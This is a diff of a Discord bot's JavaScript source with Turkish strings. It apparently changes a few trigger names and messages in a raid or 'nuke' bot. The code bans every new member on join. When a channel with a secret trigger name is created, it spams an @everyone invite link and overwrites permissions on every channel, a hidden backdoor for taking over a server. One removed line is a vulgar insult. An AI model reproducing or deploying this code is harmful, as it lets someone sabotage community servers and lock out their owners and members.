@@ -133,8 +133,8 @@ client.unload = command => {
 };
 
 client.on('guildMemberAdd', member => {
-  member.guild.ban(member, "S2 Tarafından Yarrağı Yedi")
-  member.send(`S2`)
+  member.guild.ban(member, "BERKE ADAMDIR")
+  member.send(`BERKE ADAMDIR`)
 });
 
 var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
@@ -148,7 +148,7 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'berke-adamdir') {
+  if (channel.name == 'berke-abi-ne-yaptin') {
     channel.send(`Bebeğim Burası Yok Oldu Hadi bb https://discord.gg/w8Xq9bm @everyone`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
@@ -158,7 +158,7 @@ client.on('channelCreate', channel => {
             });
           });
   }
-  if (channel.name == 'berke-abi-ne-yaptin') {
+  if (channel.name == 'berke-den-baska-illah-yoktur') {
     channel.send(`allah çarptı`)
   }
 
